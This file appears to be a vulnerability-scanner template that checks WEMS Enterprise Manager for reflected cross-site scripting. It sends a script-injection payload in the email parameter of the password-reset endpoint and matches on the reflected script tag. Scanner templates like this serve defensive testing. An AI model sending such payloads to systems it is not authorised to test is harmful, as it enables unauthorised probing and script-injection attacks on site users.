id: "wems-manager-xss"
name: "WEMS Enterprise Manager - Cross-Site Scripting"
severity: "high"
description: "WEMS Enterprise Manager contains a cross-site scripting vulnerability via the /guest/users/forgotten endpoint and the email parameter, which allows a remote attacker to inject arbitrary JavaScript into the response return by the server."
tech:
  - "generic"
tags:
  - "xss"
  - "packetstorm"
  - "vuln"
cwe: "CWE-79"
reference: "https://packetstormsecurity.com/files/155777/WEMS-Enterprise-Manager-2.58-Cross-Site-Scripting.html"
spaExclusion: true
request:
  method: "GET"
  path: "/guest/users/forgotten?email=%22%3E%3Cscript%3Econfirm(document.domain)%3C/script%3E"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "status"
    status:
      - 200
  - type: "word"
    part: "body"
    words:
      - "\"><script>confirm(document.domain)</script>"
  - type: "word"
    part: "header"
    words:
      - "text/html"
